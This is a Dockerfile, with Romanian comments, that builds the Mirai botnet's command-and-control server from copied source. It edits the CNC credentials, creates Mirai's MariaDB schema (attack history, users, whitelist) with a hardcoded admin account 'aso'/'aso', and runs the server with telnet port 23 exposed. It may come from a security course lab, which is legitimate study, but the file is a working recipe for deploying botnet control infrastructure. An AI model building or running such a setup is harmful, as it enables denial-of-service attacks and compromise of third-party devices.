FROM golang:latest

# Instalează pachetele necesare
RUN apt update && apt install -y \
    mariadb-server \
    mariadb-client \
    telnet \
    netcat-openbsd

# Creare director de lucru
WORKDIR /app

# Copiere cod sursă Mirai
COPY Mirai-Source-Code /app/Mirai-Source-Code

# Configurare CNC
WORKDIR /app/Mirai-Source-Code/mirai
RUN sed -i 's/root/asodb/' cnc/main.go
RUN sed -i 's/password/asodb/' cnc/main.go

# Construire aplicație CNC
RUN go mod init cnc.mirai
RUN go mod tidy
RUN go build -o /app/cnc cnc/*.go

# Revenire la directorul de lucru
WORKDIR /app

# Configurare baza de date și pornire MariaDB
RUN service mariadb start && \
    while ! mysqladmin ping --silent; do \
        sleep 1; \
    done && \
    echo "CREATE OR REPLACE USER 'asodb'@'localhost' IDENTIFIED BY 'asodb'; \
          GRANT ALL ON *.* TO 'asodb'@'localhost' IDENTIFIED BY 'asodb' WITH GRANT OPTION; \
          FLUSH PRIVILEGES; \
          CREATE OR REPLACE DATABASE mirai; \
          USE mirai; \
          CREATE TABLE \`history\` ( \
            \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \
            \`user_id\` int(10) unsigned NOT NULL, \
            \`time_sent\` int(10) unsigned NOT NULL, \
            \`duration\` int(10) unsigned NOT NULL, \
            \`command\` text NOT NULL, \
            \`max_bots\` int(11) DEFAULT '-1', \
            PRIMARY KEY (\`id\`), \
            KEY \`user_id\` (\`user_id\`) \
          ); \
          CREATE TABLE \`users\` ( \
            \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \
            \`username\` varchar(32) NOT NULL, \
            \`password\` varchar(32) NOT NULL, \
            \`duration_limit\` int(10) unsigned DEFAULT NULL, \
            \`cooldown\` int(10) unsigned NOT NULL, \
            \`wrc\` int(10) unsigned DEFAULT NULL, \
            \`last_paid\` int(10) unsigned NOT NULL, \
            \`max_bots\` int(11) DEFAULT '-1', \
            \`admin\` int(10) unsigned DEFAULT '0', \
            \`intvl\` int(10) unsigned DEFAULT '30', \
            \`api_key\` text, \
            PRIMARY KEY (\`id\`), \
            KEY \`username\` (\`username\`) \
          ); \
          CREATE TABLE \`whitelist\` ( \
            \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \
            \`prefix\` varchar(16) DEFAULT NULL, \
            \`netmask\` tinyint(3) unsigned DEFAULT NULL, \
            PRIMARY KEY (\`id\`), \
            KEY \`prefix\` (\`prefix\`) \
          ); \
          INSERT INTO \`users\` VALUES (NULL, 'aso', 'aso', 0, 0, 0, 0, -1, 1, 30, '');"

# Setare porturi expuse
EXPOSE 23 101

# Comandă de rulare la pornire
CMD ["sh", "-c", "service mariadb start && /app/cnc"]

